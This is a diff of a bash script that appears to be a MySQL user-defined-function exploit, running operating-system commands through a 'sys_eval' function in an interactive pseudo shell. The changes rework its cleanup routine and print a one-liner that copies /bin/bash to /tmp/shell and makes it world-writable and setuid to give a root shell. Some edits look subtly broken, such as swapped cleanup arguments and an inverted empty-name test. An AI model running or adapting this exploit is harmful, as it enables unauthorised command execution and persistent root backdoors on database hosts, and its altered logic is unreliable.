@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-#author: unkn0wnsyst3m
+#author: midnightseer
 #location: https://gist.github.com/MidnightSeer/99f42947b41b9f51a1b15107ba8d5c07
 
 #resources:
@@ -66,11 +66,13 @@ fi
 #create udf file
 
 function cleanup () {
-    table_name=$1
-    tmp_udf=$2
+    table_name=$2
+    tmp_udf=$1
     #echo "[*] Running Cleanup..."
-    if [[ $table_name != "" ]]
+    if [[ -z $table_name ]]
     then
+        echo "[*] Removing Table: $table_name"
+
         output=$((mysql -E --user=$username --password=$password --host=$host -e "use mysql;drop table $table_name")2>/dev/null)
         if [[ $output == "" ]]
         then
@@ -79,7 +81,9 @@ function cleanup () {
             echo "${RED}[-] Unable to remove table: $table_name${NC}"
             echo "$output"
         fi
+        
     fi
+    echo "[*] Removing Temp-UDF: $tmp_udf"
     output=$((rm $tmp_udf)2>/dev/null)
     if [[ $output == "" ]]
     then
@@ -88,6 +92,8 @@ function cleanup () {
         echo "${RED}[-] Unable to remove temp udf file: $tmp_udf${NC}"
         echo "$output"
     fi
+    echo "[*] Removing User Function"
+    output=$((mysql -E --user=$username --password=$password --host=$host -e "drop function sys_eval")2>/dev/null)
 }
 
 udf_name=$RANDOM.so
@@ -173,7 +179,7 @@ cmd_input=""
 if [[ $cmd == "" ]]
 then
     echo "[*] Entering a psuedo shell - type 'exit' to quit"
-    echo "SUID SHELL: r=\$RANDOM;cp /bin/bash /tmp/\$r && chmod +s /tmp/\$r; echo \"shell: /tmp/\$r -p\""
+    echo "SUID SHELL: cp /bin/bash /tmp/shell && chmod ugo+rwx /tmp/shell && chmod +s /tmp/shell; echo \"shell: /tmp/shell -p\""
 
     while [[ $cmd_input != "exit" ]]
     do
@@ -181,7 +187,7 @@ then
         if [[ $cmd_input == exit ]]
         then
             echo "^punt!"
-            echo "[*] Running Cleaning on table: $table_name, Temp-UDF: $tmp_udf"
+            echo "[*] Cleaning..."
             cleanup $table_name $tmp_udf
             exit
         fi
@@ -195,8 +201,8 @@ else
         output=$((mysql --user=$username --password=$password --host=$host -e "use mysql;select sys_eval('$cmd_input');")2>/dev/null)
         echo "[*] Running:\n $cmd_input"
         printf "$output\n"
-        cleanup $table_name $tmp_udf
+        cleanup $tmp_udf $table_name 
     fi
 fi
 # suid binary shell
-#r=$RANDOM;cp /bin/bash /tmp/$r && chmod +s /tmp/$r; echo "shell: /tmp/$r -p"
+#SUID SHELL: cp /bin/bash /tmp/shell && chmod ugo+rwx /tmp/shell && chmod +s /tmp/shell; echo "shell: /tmp/shell -p"
